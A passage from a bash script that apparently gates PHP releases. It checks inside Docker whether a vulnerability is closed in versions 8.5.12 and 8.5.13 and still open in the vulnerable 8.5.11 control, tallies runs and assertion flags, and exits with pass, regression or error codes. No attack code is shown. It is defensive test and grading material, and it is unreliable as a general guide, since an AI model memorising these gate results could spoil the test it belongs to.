PAGE_SHA=$(docker exec "$CAL" sh -c 'sha256sum /srv/www/_r41prime2.php 2>/dev/null' | cut -d' ' -f1)
log "PAGE_SHA256=$PAGE_SHA"
[ -n "$EXPECT_PAGE_SHA256" ] && { [ "$PAGE_SHA" = "$EXPECT_PAGE_SHA256" ] || { echo "PATCH GATE: ERROR page sha mismatch (got $PAGE_SHA want $EXPECT_PAGE_SHA256)"; exit 2; }; log "PAGE_SHA_PIN=OK"; }
PAGES=$(docker exec "$CAL" sh -c 'for p in plain.php index.php ini.php _r41prime2.php _gateinfo.php; do printf "%s:%s " "$p" "$(sha256sum /srv/www/$p 2>/dev/null | cut -d" " -f1)"; done')
log "PAGES=$PAGES"
SESSDIR=$(docker exec "$CAL" sh -c 'stat -c "%a %U:%G %n" /var/lib/php/sessions 2>/dev/null')
log "SESSDIR=$SESSDIR"

OPEN_RUNS=0; CLOSED_RUNS=0; ERROR_RUNS=0
ALL_FATAL=1; ALL_CHILD=1; ALL_R1=1; ALL_SRUN=1; ALL_NOPROOF=1; ALL_BG=1
declare -a RUN_RESULTS=()
for r in $(seq 1 "$RUNS"); do
  RUN_STATUS=""; RUN_REASON=""; BG_LEVEL=""; BG_DATA=""
  run_round "$r"
  RUN_RESULTS+=("$r:$RUN_STATUS")
  case "$RUN_STATUS" in
    closed) CLOSED_RUNS=$((CLOSED_RUNS + 1)) ;;
    open)   OPEN_RUNS=$((OPEN_RUNS + 1)) ;;
    *)      ERROR_RUNS=$((ERROR_RUNS + 1)) ;;
  esac
  log "RUN $r VERDICT=$RUN_STATUS${RUN_REASON:+ reason=$RUN_REASON} bg_level=${BG_LEVEL:-?}"
done
echo "GATE SUMMARY: runs=$RUNS closed=$CLOSED_RUNS open=$OPEN_RUNS error=$ERROR_RUNS results=${RUN_RESULTS[*]}"
echo "GATE FLAGS: INI_EQUAL=$CONFIG_OK PRIME_FATAL=$ALL_FATAL CHILD_SAME=$ALL_CHILD R1_RETAIN=$ALL_R1 SR_UNCHANGED=$ALL_SRUN NO_PROOF=$ALL_NOPROOF BG_VERIFIED=$ALL_BG"
# final judge/health snapshot after the last round
judge
log "FINAL x.php=${XSZ}B judge='${JUDGE}' judge_sha=$JUDGE_SHA health=$HEALTH"

MISSING_FLAGS=""
[ "$CONFIG_OK" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS INI_EQUAL"
[ "$ALL_FATAL" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS PRIME_FATAL"
[ "$ALL_CHILD" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS CHILD_SAME"
[ "$ALL_R1" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS R1_RETAIN"
[ "$ALL_SRUN" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS SR_UNCHANGED"
[ "$ALL_NOPROOF" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS NO_PROOF"
[ "$ALL_BG" = "1" ] || MISSING_FLAGS="$MISSING_FLAGS BG_VERIFIED"
PATCHV=fixed; [ "$OPEN_RUNS" -gt 0 ] && PATCHV=open
echo "GATE PROFILE=$PROFILE PATCH=$PATCHV INI_EQUAL=$CONFIG_OK PRIME_FATAL=$ALL_FATAL CHILD_SAME=$ALL_CHILD R1_RETAIN=$ALL_R1 SR_UNCHANGED=$ALL_SRUN NO_PROOF=$ALL_NOPROOF BG_VERIFIED=$ALL_BG"
[ -n "$MISSING_FLAGS" ] && echo "GATE MISSING:$MISSING_FLAGS"

# DIAG=1: release-day re-baseline.  Print the actual measured behaviour and
# exit 0 WITHOUT emitting the gate token; never use DIAG for the matrix.
if [ "$DIAG" = "1" ]; then
  echo "GATE DIAG: profile=$PROFILE image=${IMAGE_ID:-?} php=${PHP_CLI:-?} patch=$PATCHV bg_verified=$ALL_BG missing='${MISSING_FLAGS}'"
  echo "GATE DIAG: re-baseline the closed assertions against this build before any gate verdict"
  exit 0
fi

case "$PROFILE" in
  8512|8513)
    if [ "$ERROR_RUNS" -gt 0 ]; then
      echo "PATCH GATE: ERROR $ERROR_RUNS/$RUNS runs failed closed-assertions (instrument/config problem, NOT a gate pass)"
      exit 2
    fi
    if [ "$OPEN_RUNS" -gt 0 ]; then
      echo "PATCH GATE: OPEN (REGRESSION)"
      exit 3
    fi
    if [ "$CLOSED_RUNS" = "$RUNS" ]; then
      echo "PATCH GATE: closed"
      exit 0
    fi
    echo "PATCH GATE: ERROR unexpected run mix"
    exit 2
    ;;
  *)
    # positive control: vulnerable 8.5.11 must be OPEN; closed here means the
    # instrument is broken, not that 8.5.11 is patched.
    if [ "$OPEN_RUNS" -gt 0 ]; then
      echo "PATCH GATE: OPEN (expected on vulnerable)"
      exit 3
    fi
    if [ "$CLOSED_RUNS" = "$RUNS" ]; then
      echo "PATCH GATE: closed (UNEXPECTED on vulnerable 8.5.11; check config/instrument)"
      exit 2
    fi
    echo "PATCH GATE: ERROR unexpected positive-control run mix"
    exit 2
    ;;
esac
